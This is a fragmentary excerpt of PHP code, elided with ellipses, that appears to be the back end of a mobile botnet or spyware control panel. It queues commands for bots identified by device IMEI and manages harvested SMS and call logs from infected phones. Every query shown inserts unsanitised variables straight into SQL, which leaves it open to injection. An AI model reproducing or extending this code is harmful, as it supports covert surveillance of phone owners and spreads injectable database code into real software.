 ...
 $connection = mysqli_connect($HostName,$HostUser,$HostPass,$DatabaseName);
  ...
  //**************************************************************************************************
   ...
   $sql = "INSERT INTO tbl_cmdhistory (clm_command, clm_device_imei) VALUES ('$command', '$botid')";
    ...
    $sql1 = "DELETE FROM tbl_rcallogs WHERE clm_device_number=$UID";
    
 $result = mysqli_query($connection, $sql1) or die("Error in Selecting " . mysqli_error($connection));
     

   $sql = "UPDATE tbl_device SET clm_currentcommand='$command' , clm_commandseen='0' WHERE clm_device_id=$UID";
...
//*************************************************************************
    ...
    $sql1 = "DELETE FROM tbl_rsmslogs WHERE clm_device_id=$UID";
...
//**************************************************************************
    ...
    $sql1 = "DELETE FROM tbl_device WHERE clm_device_id=$UID";
        $sql2 = "DELETE FROM tbl_rsmslogs WHERE clm_device_id=$UID";
        $sql3 = "DELETE FROM tbl_rcallogs WHERE clm_device_id=$UID";
 ...
 $result = mysqli_query($connection, $sql3) or die("Error in Selecting " . mysqli_error($connection));
   ...
   $sql = "DELETE from tbl_device_details where clm_device_imei=$UID";
